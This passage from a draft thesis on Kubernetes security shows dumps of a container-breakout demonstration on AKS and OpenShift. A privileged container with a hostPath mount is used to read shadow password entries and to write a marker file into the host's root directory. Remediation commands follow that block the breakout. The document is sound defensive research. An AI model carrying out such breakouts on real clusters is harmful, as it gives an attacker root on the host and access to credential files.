lp:*:18030:0:99999:7:::
mail:*:18030:0:99999:7:::
news:*:18030:0:99999:7:::
uucp:*:18030:0:99999:7:::
proxy:*:18030:0:99999:7:::
www-data:*:18030:0:99999:7:::
backup:*:18030:0:99999:7:::
list:*:18030:0:99999:7:::
irc:*:18030:0:99999:7:::
gnats:*:18030:0:99999:7:::
nobody:*:18030:0:99999:7:::
systemd-timesync:*:18030:0:99999:7:::
systemd-network:*:18030:0:99999:7:::
systemd-resolve:*:18030:0:99999:7:::
systemd-bus-proxy:*:18030:0:99999:7:::
syslog:*:18030:0:99999:7:::
_apt:*:18030:0:99999:7:::
lxd:*:18030:0:99999:7:::
messagebus:*:18030:0:99999:7:::
uuidd:*:18030:0:99999:7:::
dnsmasq:*:18030:0:99999:7:::
sshd:*:18030:0:99999:7:::
pollinate:*:18030:0:99999:7:::
unscd:*:18031:0:99999:7:::
statd:*:18039:0:99999:7:::
ceph:*:18039:0:99999:7:::
azureuser:!:18064:7:90:7:30::
-----------
        root directory of underlying node
total 100
drwxr-xr-x   23 root     root          4096 Jun 17 12:59 .
drwxr-xr-x    1 root     root          4096 Jun 17 13:02 ..
-rw-------    1 root     root          1024 Jun 17 07:56 .rnd
drwxr-xr-x    2 root     root          4096 May 23 18:48 bin
drwxr-xr-x    3 root     root          4096 Jun 17 07:58 boot
drwxr-xr-x   16 root     root          3760 Jun 17 07:56 dev
drwxr-xr-x  104 root     root          4096 Jun 17 07:58 etc
drwxr-xr-x    3 root     root          4096 Jun 17 07:56 home
lrwxrwxrwx    1 root     root            33 Jun 17 07:58 initrd.img -> boot/initrd.img-4.15.0-1046-azure
lrwxrwxrwx    1 root     root            33 May 15 03:24 initrd.img.old -> boot/initrd.img-4.15.0-1045-azure
drwxr-xr-x   21 root     root          4096 May 23 18:49 lib
drwxr-xr-x    2 root     root          4096 May 14 21:21 lib64
drwx------    2 root     root         16384 May 14 21:29 lost+found
drwxr-xr-x    2 root     root          4096 May 14 21:20 media
drwxr-xr-x    3 root     root          4096 Jun 17 07:56 mnt
drwxr-xr-x    5 root     root          4096 Jun 17 07:56 opt
dr-xr-xr-x  221 root     root             0 Jun 17 07:55 proc
drwx------    3 root     root          4096 May 23 18:46 root
drwxr-xr-x   31 root     root          1460 Jun 17 13:02 run
drwxr-xr-x    2 root     root         12288 Jun 17 07:58 sbin
drwxr-xr-x    2 root     root          4096 May 23 18:46 snap
drwxr-xr-x    2 root     root          4096 May 14 21:20 srv
dr-xr-xr-x   12 root     root             0 Jun 17 12:29 sys
drwxrwxrwt    8 root     root          4096 Jun 17 13:02 tmp
drwxr-xr-x   11 root     root          4096 May 23 18:49 usr
drwxr-xr-x   14 root     root          4096 May 23 19:05 var
lrwxrwxrwx    1 root     root            30 Jun 17 07:58 vmlinuz -> boot/vmlinuz-4.15.0-1046-azure
lrwxrwxrwx    1 root     root            30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
-----------
        root directory of underlying node after manipulation through this container
total 100
drwxr-xr-x   23 root     root          4096 Jun 17 13:02 .
drwxr-xr-x    1 root     root          4096 Jun 17 13:02 ..
-rw-------    1 root     root          1024 Jun 17 07:56 .rnd
-rw-r--r--    1 root     root             0 Jun 17 13:02 ALL_YOUR_NODES_ARE_BELONG_TO_US
drwxr-xr-x    2 root     root          4096 May 23 18:48 bin
drwxr-xr-x    3 root     root          4096 Jun 17 07:58 boot
drwxr-xr-x   16 root     root          3760 Jun 17 07:56 dev
drwxr-xr-x  104 root     root          4096 Jun 17 07:58 etc
drwxr-xr-x    3 root     root          4096 Jun 17 07:56 home
lrwxrwxrwx    1 root     root            33 Jun 17 07:58 initrd.img -> boot/initrd.img-4.15.0-1046-azure
lrwxrwxrwx    1 root     root            33 May 15 03:24 initrd.img.old -> boot/initrd.img-4.15.0-1045-azure
drwxr-xr-x   21 root     root          4096 May 23 18:49 lib
drwxr-xr-x    2 root     root          4096 May 14 21:21 lib64
drwx------    2 root     root         16384 May 14 21:29 lost+found
drwxr-xr-x    2 root     root          4096 May 14 21:20 media
drwxr-xr-x    3 root     root          4096 Jun 17 07:56 mnt
drwxr-xr-x    5 root     root          4096 Jun 17 07:56 opt
dr-xr-xr-x  221 root     root             0 Jun 17 07:55 proc
drwx------    3 root     root          4096 May 23 18:46 root
drwxr-xr-x   31 root     root          1460 Jun 17 13:02 run
drwxr-xr-x    2 root     root         12288 Jun 17 07:58 sbin
drwxr-xr-x    2 root     root          4096 May 23 18:46 snap
drwxr-xr-x    2 root     root          4096 May 14 21:20 srv
dr-xr-xr-x   12 root     root             0 Jun 17 12:29 sys
drwxrwxrwt    8 root     root          4096 Jun 17 13:02 tmp
drwxr-xr-x   11 root     root          4096 May 23 18:49 usr
drwxr-xr-x   14 root     root          4096 May 23 19:05 var
lrwxrwxrwx    1 root     root            30 Jun 17 07:58 vmlinuz -> boot/vmlinuz-4.15.0-1046-azure
lrwxrwxrwx    1 root     root            30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
\end{lstlisting}
\fi
CONTAINER BREAKOUT AKS RESULT DUMP
\iffalse
\begin{lstlisting}[


azureuser@aks-agentpool-35206649-1:~$ ls -la /
total 100
drwxr-xr-x  23 root root  4096 Jun 17 13:02 .
drwxr-xr-x  23 root root  4096 Jun 17 13:02 ..
-rw-r--r--   1 root root     0 Jun 17 13:02 ALL_YOUR_NODES_ARE_BELONG_TO_US
drwxr-xr-x   2 root root  4096 May 23 18:48 bin
drwxr-xr-x   3 root root  4096 Jun 17 07:58 boot
drwxr-xr-x  16 root root  3760 Jun 17 07:56 dev
drwxr-xr-x 104 root root  4096 Jun 17 07:58 etc
drwxr-xr-x   3 root root  4096 Jun 17 07:56 home
lrwxrwxrwx   1 root root    33 Jun 17 07:58 initrd.img -> boot/initrd.img-4.15.0-1046-azure
lrwxrwxrwx   1 root root    33 May 15 03:24 initrd.img.old -> boot/initrd.img-4.15.0-1045-azure
drwxr-xr-x  21 root root  4096 May 23 18:49 lib
drwxr-xr-x   2 root root  4096 May 14 21:21 lib64
drwx------   2 root root 16384 May 14 21:29 lost+found
drwxr-xr-x   2 root root  4096 May 14 21:20 media
drwxr-xr-x   3 root root  4096 Jun 17 07:56 mnt
drwxr-xr-x   5 root root  4096 Jun 17 07:56 opt
dr-xr-xr-x 221 root root     0 Jun 17 07:55 proc
-rw-------   1 root root  1024 Jun 17 07:56 .rnd
drwx------   3 root root  4096 May 23 18:46 root
drwxr-xr-x  31 root root  1460 Jun 17 13:02 run
drwxr-xr-x   2 root root 12288 Jun 17 07:58 sbin
drwxr-xr-x   2 root root  4096 May 23 18:46 snap
drwxr-xr-x   2 root root  4096 May 14 21:20 srv
dr-xr-xr-x  12 root root     0 Jun 17 12:29 sys
drwxrwxrwt   8 root root  4096 Jun 17 13:06 tmp
drwxr-xr-x  11 root root  4096 May 23 18:49 usr
drwxr-xr-x  14 root root  4096 May 23 19:05 var
lrwxrwxrwx   1 root root    30 Jun 17 07:58 vmlinuz -> boot/vmlinuz-4.15.0-1046-azure
lrwxrwxrwx   1 root root    30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
\end{lstlisting}
\fi
\subsection{Selecting security measures}

TODO dont allow privileged containers (scc in OCP, podsecuritypolicies in AKS)


CONTAINER BREAKOUT OCP REMEDIATION DUMP
\iffalse
\begin{lstlisting}[
[root@openshiftmaster ~]# oc adm policy scc-review -z default -f container_breakout.yaml
RESOURCE       SERVICE ACCOUNT   ALLOWED BY
Pod/breakout   default           privileged
[root@openshiftmaster ~]# oc adm policy remove-scc-from-user privileged -z default
scc "privileged" removed from: ["system:serviceaccount:testuser:default"]
[root@openshiftmaster ~]# oc adm policy scc-review -z default -f container_breakout.yaml
RESOURCE   SERVICE ACCOUNT   ALLOWED BY
\end{lstlisting}
\fi
CONTAINER BREAKOUT AKS REMEDIATION CMDs
\iffalse
Enable PSP on the cluster:
az aks update --resource-group kubernetes-ba-test --name demo-cluster-LGR --enable-pod-security-policy
Create (non-admin) account:
kubectl create serviceaccount --namespace testuser nonadmin-user
kubectl create rolebinding --namespace testuser nonadmin-rolebinding --clusterrole=edit --serviceaccount=testuser:nonadmin-user
Delete \& (try) redeploy breakout container (as non-admin):
kubectl delete pod breakout
kubectl --as=system:serviceaccount:testuser:nonadmin-user apply -f container_breakout.yaml
(OPTIONAL: Check why - Kubectl get psp)
\fi
CONTAINER BREAKOUT AKS REMEDIATION DUMP
\iffalse
\begin{lstlisting}[
lukas@Azure:~$ kubectl get pods
NAME            READY   STATUS    RESTARTS   AGE
network-utils   1/1     Running   0          17m
lukas@Azure:~$ az aks update --resource-group kubernetes-ba-test --name demo-cluster-LGR --enable-pod-security-policy
{
  "aadProfile": null,
  "addonProfiles": {
    "httpApplicationRouting": {
      "config": null,
      "enabled": false
    }
  },
  "agentPoolProfiles": [
    {
      "availabilityZones": null,
      "count": 2,
      "enableAutoScaling": null,
      "maxCount": null,
      "maxPods": 30,
      "minCount": null,
      "name": "agentpool",
      "orchestratorVersion": "1.11.9",
      "osDiskSizeGb": 100,
      "osType": "Linux",
      "provisioningState": "Succeeded",
      "type": "AvailabilitySet",
      "vmSize": "Standard_DS2_v2",
      "vnetSubnetId": "/subscriptions/fe1ae95c-b0ef-4525-8b1c-d44e763a90e6/resourceGroups/kubernetes-ba-test/providers/Microsoft.Network/virtualNetworks/kubernetes-ba-test-vnet/subnets/default"
    }
  ],
  "apiServerAuthorizedIpRanges": null,
  "dnsPrefix": "demo-cluster-LGR-dns",
  "enablePodSecurityPolicy": true,
  "enableRbac": true,
  "fqdn": "demo-cluster-lgr-dns-7d796dfe.hcp.northeurope.azmk8s.io",
  "id": "/subscriptions/fe1ae95c-b0ef-4525-8b1c-d44e763a90e6/resourcegroups/kubernetes-ba-test/providers/Microsoft.ContainerService/managedClusters/demo-cluster-LGR",
  "identity": null,
  "kubernetesVersion": "1.11.9",
  "linuxProfile": null,
  "location": "northeurope",
  "maxAgentPools": 1,
  "name": "demo-cluster-LGR",
  "networkProfile": {
    "dnsServiceIp": "10.0.0.10",
    "dockerBridgeCidr": "172.17.0.1/16",
    "loadBalancerSku": "basic",
    "networkPlugin": "azure",
    "networkPolicy": null,
    "podCidr": null,
    "serviceCidr": "10.0.0.0/16"
  },
  "nodeResourceGroup": "MC_kubernetes-ba-test_demo-cluster-LGR_northeurope",
  "provisioningState": "Succeeded",
  "resourceGroup": "kubernetes-ba-test",
  "servicePrincipalProfile": {
    "clientId": "bba9cd4a-35b8-4356-bf43-8b48752bf0e4",
    "secret": null
  },
  "tags": null,
  "type": "Microsoft.ContainerService/ManagedClusters",
  "windowsProfile": null
}
lukas@Azure:~$ kubectl create serviceaccount --namespace testuser nonadmin-user
serviceaccount/nonadmin-user created
lukas@Azure:~$ kubectl create rolebinding --namespace testuser nonadmin-rolebinding --clusterrole=edit --serviceaccount=testuser:nonadmin-user
rolebinding.rbac.authorization.k8s.io/nonadmin-rolebinding created
lukas@Azure:~$ kubectl --as=system:serviceaccount:testuser:nonadmin-user apply -f container_breakout.yaml
Error from server (Forbidden): error when creating "container_breakout.yaml": pods "breakout" is forbidden: unable to validate against any pod security policy: [spec.volumes[0]: Invalid value: "hostPath": hostPath volumes are not allowed to be used spec.containers[0].securityContext.privileged: Invalid value: true: Privileged containers are not allowed]
\end{lstlisting}
\fi
\subsection{Demonstration with implemented security measures}

%TODO: maybe show again without privileged, but with uid 0?

TODO move pics, listings from above here

\subsection{Risk reassessment 2}

TODO SECOND updated table of risk for ocp AND aks <- this one starts with first updated one

\section{How to proceed}
%process only partially completed, how to proceed if you do everything. (point to completed list of measure recommendations + new risk?)

TODO would start with highest vector, check possible measures and implement when acceptable/applicable. reassess vector risk and either implement more XOR accept residual risk if still highest. otherwise put back into queue -> pick up now highest vector and check possible measures, ... -> repeat until risks are either all below target threshold or all above are accepted.

\chapter{Conclusion}
This chapter aims to provide answers to the remaining questions posed in chapter \ref{goal}.

%\subsection{On-premise and public cloud environment comparison}
%TODO 2 subsubsections, generic cloud vs on-prem + AKS vs OCP?

%TODO both have pros and cons, regardless of specific solution picked.  Specific solutions have their pros and cons, too. cloud risk may be higher initially (both in the solutions we looked at and in general), but there are measures to reduce that to acceptable level for baseline security. some usecases benefit from buy-iaas-provide-paas, since more control with you as provider. high-security requirements on-prem probably better (and may be needed for compliance).
%-> our POV both work, would have to be decided on a case-by-case basis as they depend on many factors (integration with other offers or services very valuable for cloud-specific, pre-existing on-prem datacenters make on-prem easier).

\subsection{Multi-tenant isolation}
%TODO: Comments on multi-tenant usage
%TODO: keep this in? not a well-defined question in the beginning

TODO namespace/project isolation vs. cluster isolation. refer to separate-tenants-by-cluster measure in vector identification section. Is possible, but more complex and tedious ATM. refer to growing projects for cluster federation and clusters-as-cattle (instead of container-as-cattle and cluster-as-pet)
-> may be better in future, only do today for super-high-security apps in their own cluster. costs more resources, at which point one may simply run the stuff on isolated and dedicated servers anyway (except when needed for workflow, high availability or mircoservice arch offsets complexity needed)?

\subsection{Summary}
%TODO summary of thesis process, outlook, commentary

TODO summary of thesis process - huge scope, could have been better defined beforehand. risk estimate formula still isnt perfect, but time would probably still be better allocated to practical stuff or more research, both for thesis and others trying to follow the process. no use in better knowing which one is the biggest problem if no time left to reduce risk in the end. hope that more sources are published and industry standards crystallize so not everyone has to do that much research on their own.

TODO outlook - stuff will continue to move fast, hopefully with security in mind. we are currently far better with security than i.e. pre k8s-1.8. more security features will be introduced or go stable (refer to future k8s pod sandbox option in YAML files). as mentioned in multi-tenant isolation, cluster federation might help and will introduce new solutions, but probably also new problems. rootless builds, currently through buildah etc, becoming more mainstream will probably be the next big security thing here.
% rootless container runtime \& build: https://github.com/moby/moby/pull/38050 %

TODO commentary - hope this helps someone and spares some time. am excited for future tools and platform developments.
